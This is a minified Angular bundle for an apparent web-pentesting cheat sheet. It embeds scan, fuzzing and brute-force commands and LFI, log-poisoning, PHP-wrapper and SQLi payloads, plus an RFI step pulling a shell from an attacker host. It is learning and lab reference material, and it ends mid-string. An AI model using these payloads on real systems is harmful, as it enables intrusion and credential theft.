import{a as v,b as P,c as T,d as C,e as R,f as O,g as D,h as W}from"./chunk-BVWXNWOE.js";import"./chunk-GFLLK36M.js";import{$ as f,$a as y,Ea as n,F as x,Fa as S,U as i,Ua as b,Va as w,Wa as I,Za as E,da as h,ka as o,la as t,ma as e,na as s,ra as m,sa as d,ua as g,va as c,y as u}from"./chunk-FQT5HG3D.js";function F(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"Recon"),e(),t(3,"p",11),n(4," Start by identifying the target's exposed web services, ports and applications before moving into deeper enumeration. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Port & Service Discovery "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," HTTP / HTTPS "),e()()(),d()),r&2){let a=c();i(9),o("command",a.webRecon)}}function U(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"Technology Identification"),e(),t(3,"p",11),n(4," Identify the technologies behind the application, including web servers, frameworks, CMS platforms and JavaScript components. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Technology Detection "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Headers & Responses "),e()(),s(14,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.webTechnology),i(5),o("command",a.webHeaders)}}function Z(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"Directory & File Discovery"),e(),t(3,"p",11),n(4," Discover hidden directories, files, backups and other resources that are not directly linked from the application. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Gobuster "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Feroxbuster "),e()(),s(14,"app-terminal",12),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18," FFUF "),e()(),s(19,"app-terminal",12),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23," Wfuzz "),e()(),s(24,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.gobuster),i(5),o("command",a.feroxbusterCommands),i(5),o("command",a.ffufCommands),i(5),o("command",a.wfuzzCommands)}}function z(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"WordPress"),e(),t(3,"p",11),n(4," Fingerprint WordPress, enumerate users and components, and assess authentication and administrative attack surfaces. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"WordPress Fingerprinting"),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"WPScan"),e()(),s(14,"app-terminal",12),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Manual Plugin Enumeration"),e()(),s(19,"app-terminal",12),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"XML-RPC"),e()(),s(24,"app-terminal",12),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Authentication Assessment"),e()(),s(29,"app-terminal",12),e(),t(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),n(33,"Post-Enumeration Assessment"),e()(),s(34,"app-terminal",12),e(),t(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),n(38,"Assessment Workflow"),e()(),s(39,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.wordpressFingerprint),i(5),o("command",a.wordpressWpscan),i(5),o("command",a.wordpressManual),i(5),o("command",a.wordpressXmlrpc),i(5),o("command",a.wordpressAuthentication),i(5),o("command",a.wordpressPostEnumeration),i(5),o("command",a.wordpressWorkflow)}}function A(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"Authentication"),e(),t(3,"p",11),n(4," Identify login mechanisms, authentication weaknesses, session handling and access control issues. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Login Enumeration "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Session Testing "),e()(),s(14,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.webAuthentication),i(5),o("command",a.webSessions)}}function M(r,l){if(r&1&&(m(0),t(1,"mat-expansion-panel")(2,"mat-expansion-panel-header")(3,"mat-panel-title"),n(4,"Basic Concepts"),e()(),s(5,"app-terminal",12),e(),t(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),n(9,"Types of SQL Injection"),e()(),s(10,"app-terminal",12),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14,"Initial Testing Payloads"),e()(),s(15,"app-terminal",12),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19,"Filter Bypass Techniques"),e()(),s(20,"app-terminal",12),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24,"UNION-Based Injection"),e()(),s(25,"app-terminal",12),e(),t(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),n(29,"Blind SQL Injection"),e()(),s(30,"app-terminal",12),e(),t(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),n(34,"Useful SQL Functions"),e()(),s(35,"app-terminal",12),e(),t(36,"mat-expansion-panel")(37,"mat-expansion-panel-header")(38,"mat-panel-title"),n(39,"SQL Injection \u2192 RCE"),e()(),s(40,"app-terminal",12),e(),t(41,"mat-expansion-panel")(42,"mat-expansion-panel-header")(43,"mat-panel-title"),n(44,"Out-of-Band SQL Injection"),e()(),s(45,"app-terminal",12),e(),t(46,"mat-expansion-panel")(47,"mat-expansion-panel-header")(48,"mat-panel-title"),n(49,"Practical Exploitation Flow"),e()(),s(50,"app-terminal",12),e(),t(51,"mat-expansion-panel")(52,"mat-expansion-panel-header")(53,"mat-panel-title"),n(54,"Important Notes"),e()(),s(55,"app-terminal",12),e(),d()),r&2){let a=c();i(5),o("command",a.sqliConcepts),i(5),o("command",a.sqliTypes),i(5),o("command",a.sqliTesting),i(5),o("command",a.sqliFilterBypass),i(5),o("command",a.sqliUnion),i(5),o("command",a.sqliBlind),i(5),o("command",a.sqliEnumeration),i(5),o("command",a.sqliRce),i(5),o("command",a.sqliOob),i(5),o("command",a.sqliFlow),i(5),o("command",a.sqliNotes)}}function k(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"OS Command Injection"),e(),t(3,"p",11),n(4," Test user-controlled inputs that may be incorporated into operating-system commands, identify the execution context and validate impact safely. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Concept"),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Detection"),e()(),s(14,"app-terminal",12),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"OS and Environment Enumeration"),e()(),s(19,"app-terminal",12),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Command Separators"),e()(),s(24,"app-terminal",12),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Bypass Techniques"),e()(),s(29,"app-terminal",12),e(),t(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),n(33,"Exploitation"),e()(),s(34,"app-terminal",12),e(),t(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),n(38,"Reverse Shell"),e()(),s(39,"app-terminal",12),e(),t(40,"mat-expansion-panel")(41,"mat-expansion-panel-header")(42,"mat-panel-title"),n(43,"Notes"),e()(),s(44,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.osCommandConcept),i(5),o("command",a.osCommandDetection),i(5),o("command",a.osCommandEnumeration),i(5),o("command",a.osCommandSeparators),i(5),o("command",a.osCommandBypass),i(5),o("command",a.osCommandExploitation),i(5),o("command",a.osCommandReverseShell),i(5),o("command",a.osCommandNotes)}}function B(r,l){if(r&1&&(t(0,"mat-expansion-panel")(1,"mat-expansion-panel-header")(2,"mat-panel-title"),n(3),e()(),s(4,"app-terminal",12),e()),r&2){let a=l.$implicit;i(3),S(a.title),i(),o("command",a.command)}}function N(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"Cross-Site Scripting"),e(),t(3,"p",11),n(4," Identify reflected, stored and DOM-based XSS vulnerabilities in application inputs and client-side functionality. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Reflected XSS "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Payload Variants by Context"),e()(),t(14,"mat-accordion",13),h(15,B,5,2,"mat-expansion-panel",14),e()(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19," Stored XSS "),e()(),s(20,"app-terminal",12),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24," DOM XSS "),e()(),s(25,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.reflectedXss),i(6),o("ngForOf",a.xssPayloadVariants),i(5),o("command",a.storedXss),i(5),o("command",a.domXss)}}function H(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"File Upload"),e(),t(3,"p",11),n(4," Analyze file upload functionality, validation mechanisms and possible ways uploaded files may be processed by the application. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Upload Testing "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Concept & Potential Impact"),e()(),s(14,"app-terminal",12),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Detection & Request Inspection"),e()(),s(19,"app-terminal",12),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Filename Manipulation"),e()(),s(24,"app-terminal",12),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Traversal & File Overwrite"),e()(),s(29,"app-terminal",12),e(),t(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),n(33,"Privilege Escalation Considerations"),e()(),s(34,"app-terminal",12),e(),t(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),n(38,"Operational Notes"),e()(),s(39,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.fileUpload),i(5),o("command",a.uploadConcept),i(5),o("command",a.uploadDetection),i(5),o("command",a.uploadFilename),i(5),o("command",a.uploadTraversal),i(5),o("command",a.uploadPrivilege),i(5),o("command",a.uploadNotes)}}function q(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"LFI / RFI"),e(),t(3,"p",11),n(4," Test file inclusion functionality for local and remote file inclusion vulnerabilities. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Directory Traversal "),e()(),s(9,"app-terminal",12),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Parameter Enumeration"),e()(),s(14,"app-terminal",12),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Traversal & Filter Bypass Payloads"),e()(),s(19,"app-terminal",12),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Useful Files"),e()(),s(24,"app-terminal",12),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Testing Tools"),e()(),s(29,"app-terminal",12),e(),t(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),n(33,"Notes"),e()(),s(34,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.directoryTraversal),i(5),o("command",a.directoryTraversalParameters),i(5),o("command",a.directoryTraversalPayloads),i(5),o("command",a.directoryTraversalFiles),i(5),o("command",a.directoryTraversalTools),i(5),o("command",a.directoryTraversalNotes)}}function j(r,l){if(r&1&&(m(0),t(1,"mat-expansion-panel")(2,"mat-expansion-panel-header")(3,"mat-panel-title"),n(4," LFI "),e()(),s(5,"app-terminal",12),e(),t(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),n(9,"LFI Detection & Goals"),e()(),s(10,"app-terminal",12),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14," Log Poisoning "),e()(),s(15,"app-terminal",12),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19," PHP Wrappers "),e()(),s(20,"app-terminal",12),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24," RFI "),e()(),s(25,"app-terminal",12),e(),t(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),n(29," Workflow "),e()(),s(30,"app-terminal",12),e(),d()),r&2){let a=c();i(5),o("command",a.lfi),i(5),o("command",a.lfiDetection),i(5),o("command",a.logPoisoning),i(5),o("command",a.phpWrappers),i(5),o("command",a.rfi),i(5),o("command",a.fileInclusionWorkflow)}}function Q(r,l){if(r&1&&(m(0),t(1,"h2"),n(2,"SSRF"),e(),t(3,"p",11),n(4," Identify server-side request functionality and determine whether the application can access internal resources. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," SSRF Testing "),e()(),s(9,"app-terminal",12),e(),d()),r&2){let a=c();i(9),o("command",a.ssrf)}}var L=class r{selectedWebSection="recon";sections=[{id:"recon",label:"Recon"},{id:"technology",label:"Technology"},{id:"directories",label:"Directories"},{id:"wordpress",label:"WordPress"},{id:"authentication",label:"Authentication"},{id:"sqli",label:"SQL Injection",important:!0},{id:"os-command",label:"OS Command Injection",important:!0},{id:"xss",label:"XSS"},{id:"file-upload",label:"File Upload",important:!0},{id:"lfi",label:"LFI / RFI",important:!0},{id:"fileInclusions",label:"File Inclusions"},{id:"ssrf",label:"SSRF"}];route=u(E);router=u(y);destroyRef=u(x);ngOnInit(){this.route.queryParamMap.pipe(O(this.destroyRef)).subscribe(l=>{let a=l.get("section");a&&this.sections.some(p=>p.id===a)&&(this.selectedWebSection=a)})}selectWebSection(l){this.selectedWebSection=l,this.router.navigate([],{relativeTo:this.route,queryParams:{section:l},replaceUrl:!0})}clearWebSection(){this.selectedWebSection="recon"}webRecon=`
nmap -p- --min-rate 5000 <IP>
nmap -p80,443 -sC -sV <IP>

curl -I http://<IP>
curl -I https://<IP>
  `;webTechnology=`
whatweb http://<IP>
wappalyzer
nikto -h http://<IP>

curl -I http://<IP>
  `;webHeaders=`
curl -I http://<IP>
curl -s http://<IP> | head
  `;gobuster=`
# Directory brute force
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Basic fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -t 50

# Search for common web extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x asp,aspx,ashx,asmx,config,txt -t 50

# Search for backup files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x bak,old,save,tmp,backup,orig,swp -t 50

# Search for compressed files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x zip,tar,gz,tgz,bz2,7z,rar -t 50

# Search for database files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x sql,db,db3,sqlite,sqlite3,dump -t 50

# Search for config and secret files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Search for Git and SVN repositories
gobuster dir -u http://<IP>/ -w <WORDLIST> -x git,svn -t 50

# Filtering (status codes)
gobuster dir -u http://<IP>/ -w <WORDLIST> -s 200,204,301,302,307,403 -t 50

# Exclude responses by length
gobuster dir -u http://<IP>/ -w <WORDLIST> --exclude-length 1234

# Hide negative status codes
gobuster dir -u http://<IP>/ -w <WORDLIST> -b 404,400

# Recursive fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -r

# Fuzzing parameters (GET)
gobuster dir -u "http://<IP>/<SUBDIRECTORY>/?FUZZ=1" -w <WORDLIST>

# Fuzzing auth pages (POST)
gobuster dir -u http://<IP>/<SUBDIRECTORY>/ -w <WORDLIST> -m POST --data 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -t 50

# Subdomain enumeration
gobuster dns -d mydomain.com -w <WORDLIST>

# Virtual hosting
gobuster vhost -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com'

# Virtual hosting with IP
gobuster vhost -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/wordlists/dirbuster/
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
`;feroxbusterCommands=`# Full scan
feroxbuster -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -d 1

# Basic directory fuzzing
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e asp,aspx,ashx,asmx,config,txt -t 50

# Backup files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e bak,old,save,tmp,backup,orig,swp -t 50

# Compressed files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e zip,tar,gz,tgz,bz2,7z,rar -t 50

# Database files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e sql,db,db3,sqlite,sqlite3,dump -t 50

# Config / secret files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Recursive scanning
feroxbuster -u http://<IP>/ -w <WORDLIST> -r

# Recursive scan with depth limit
feroxbuster -u http://<IP>/ -w <WORDLIST> -d 2

# HTTPS with self-signed certificate
feroxbuster -u https://<IP>/ -k -w <WORDLIST>

# Filter status codes
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-status 404,400

# Filter response size
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-size 1234

# Filter words / lines
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-words 10 --filter-lines 5

# Extract links
feroxbuster -u http://<IP>/ -w <WORDLIST> -x js,php,html

# Save output
feroxbuster -u http://<IP>/ -w <WORDLIST> -o feroxbuster.txt

# JSON output
feroxbuster -u http://<IP>/ -w <WORDLIST> --json -o ferox.json

# Cookies
feroxbuster -u http://<IP>/ -w <WORDLIST> -C 'PHPSESSID=VALUE'

# Custom headers
feroxbuster -u http://<IP>/ -w <WORDLIST> -H 'Authorization: Bearer TOKEN'

# Custom User-Agent
feroxbuster -u http://<IP>/ -w <WORDLIST> -A 'Mozilla/5.0'

# GET parameter fuzzing
feroxbuster -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -w <WORDLIST> --filter-size 39

# POST parameter fuzzing
feroxbuster -u http://<IP>/<SUBDIRECTORY>/ -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' --filter-size 1435

# Subdomain enumeration
feroxbuster -u http://FUZZ.mydomain.com -w <WORDLIST> --filter-size 0

# Virtual hosting
feroxbuster -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --filter-size 0

# Virtual hosting with IP
feroxbuster -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/Web-Content/big.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ .htaccess .htpasswd backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/`;ffufCommands=`# Basic fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.js,.json

# Backup files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .bak,.old,.save,.swp,.tmp,.backup,.orig

# Database files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .sql,.db,.db3,.sqlite,.sqlite3,.dump

# Config / secret files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .env,.conf,.cfg,.ini,.json,.xml,.yaml,.yml,.pem,.key

# Windows / IIS files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .asp,.aspx,.config,.ashx,.asmx,.txt

# Filter status codes
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fc 404,400

# Filter response size
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fs 0

# Filter words / lines
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fw 39 -fl 10

# GET parameter fuzzing
ffuf -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -c -w <WORDLIST> -fs 39

# Multiple parameters
ffuf -u 'http://<IP>/page.php?FUZZ1=test&FUZZ2=test' -c -w <WORDLIST>

# POST parameter fuzzing
ffuf -u http://<IP>/<SUBDIRECTORY>/ -c -w <WORDLIST> -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1435

# Login brute force
ffuf -u http://<IP>/login -X POST -d 'username=FUZZ&password=FUZZ2' -w users.txt:FUZZ,pass.txt:FUZZ2 -c -fs 1234

# Subdomain enumeration
ffuf -u http://FUZZ.mydomain.com -c -w <WORDLIST> -fs 0

# Virtual hosting
ffuf -u http://mydomain.com -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' -fs 0

# Virtual hosting with IP
ffuf -u http://<IP> -H 'Host: FUZZ.thm' -w <WORDLIST> -fs 0

# Recursive fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -recursion

# Extensions + recursion
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.bak,.old -recursion

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/ logs/ .env web.config`;wfuzzCommands=`# Basic directory / file fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/FUZZ

# File extension fuzzing
wfuzz -c -w <WORDLIST> -z list,php-txt-html-js-json-bak-old http://<IP>/FUZZ.FUZ2Z

# Hide 403 responses
wfuzz -c -w <WORDLIST> --hc 403 http://<IP>/FUZZ

# Hide multiple status codes
wfuzz -c -w <WORDLIST> --hc 403,404 http://<IP>/FUZZ

# Show only valid responses
wfuzz -c -w <WORDLIST> --sc 200,301,302,307,403 http://<IP>/FUZZ

# Filter by response size
wfuzz -c -w <WORDLIST> --hh 0 http://<IP>/FUZZ

# GET parameter fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/<SUBDIRECTORY>/?FUZZ=1

# Multiple parameters
wfuzz -c -w users.txt -w pass.txt http://<IP>/login?user=FUZZ&pass=FUZ2Z

# POST parameter fuzzing
wfuzz -c -w <WORDLIST> -X POST -d 'uname=admin&passwd=FUZZ&submit=Submit' --hc 403 http://<IP>/<SUBDIRECTORY>/

# Login brute force
wfuzz -c -w users.txt -w passwords.txt -X POST -d 'username=FUZZ&password=FUZ2Z' --hc 401,403 http://<IP>/login

# Subdomain enumeration
wfuzz -c -w <WORDLIST> --hc 0 http://FUZZ.mydomain.com

# Virtual hosting
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --hc 0 http://mydomain.com

# Virtual hosting with IP
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.thm' http://<IP>

# Header fuzzing
wfuzz -c -w <WORDLIST> -H 'User-Agent: FUZZ' http://<IP>/

# Cookie fuzzing
wfuzz -c -w <WORDLIST> -b 'session=FUZZ' http://<IP>/

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/

# Useful targets
# .git/ .git/config .git/HEAD .svn/ backup/ backups/ admin/ test/ dev/ private/ db/ config/ uploads/ api/ .env web.config`;lfiInclusions=`
# Local File Inclusion (LFI)
# Vulnerable parameters may include:
# page=, file=, path=, doc=, include=, lang=, template=

# Basic LFI test
http://<IP>/index.php?page=../../../../etc/passwd

# Windows
http://<IP>/index.php?page=../../../../boot.ini

# Deep traversal
http://<IP>/index.php?page=../../../../../../../../etc/passwd

# Windows hosts file
http://<IP>/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts

# Common useful files
/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
/var/log/apache2/access.log

# Windows
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config

# Typical vulnerable code
include($_GET['page']);
`;logPoisoning=`
# Log Poisoning

# Common Linux logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log

# Common Windows logs
C:\\xampp\\apache\\logs\\access.log
C:\\xampp\\apache\\logs\\error.log
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\

# Step 1 - Inject PHP into the User-Agent
curl -A "<PHP_PAYLOAD>" http://<IP>/

# Step 2 - Include the poisoned log
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id

# Step 3 - URL encode spaces if required
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la

# Windows
http://<IP>/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=dir
`;phpWrappers=`
# PHP Wrappers

# php://filter - Read source code
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Decode Base64
echo BASE64_OUTPUT | base64 -d

# data://
http://<IP>/index.php?page=data://text/plain,<PHP_PAYLOAD>

# Execute commands
http://<IP>/index.php?page=data://text/plain,<?php system('id'); ?>

# data:// Base64
http://<IP>/index.php?page=data://text/plain;base64,<BASE64_PAYLOAD>

# php://input
curl -X POST -d "<?php system('ls'); ?>" "http://<IP>/index.php?page=php://input"

# expect:// (if enabled)
http://<IP>/index.php?page=expect://id
`;rfi=`
# Remote File Inclusion (RFI)

# Requires allow_url_include=On

# Start HTTP server
python3 -m http.server 80

# Host the remote PHP file
http://<ATTACKER-IP>/shell.php

# Include remote file
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php

# Example with parameter
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php&cmd=id

# Reverse shell
<PHP_REVERSHELL>
`;sqliConcepts=`
# SQL Injection - Basic Concepts

# Description
SQL Injection (SQLi) allows an attacker to manipulate SQL queries
through unsanitized user input.

# Example SQL query
SELECT * FROM users WHERE user_name='leon';

# Vulnerable PHP backend
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

# Core Mental Model
# 1. User input is concatenated into SQL query
# 2. Query structure becomes attacker-controlled
# 3. Goal is to change logic, extract data, or execute system actions
`;sqliTypes=`
# SQL Injection - Types

# Error-based SQLi
' OR 1=1 --

# Union-based SQLi
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT null, database(), user(), @@version --

' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --

# Blind SQL Injection

# Boolean-based
' AND 1=1 --
' AND 1=2 --

' AND IF(SUBSTRING(user(),1,1)='a',1,0) --

# Time-based
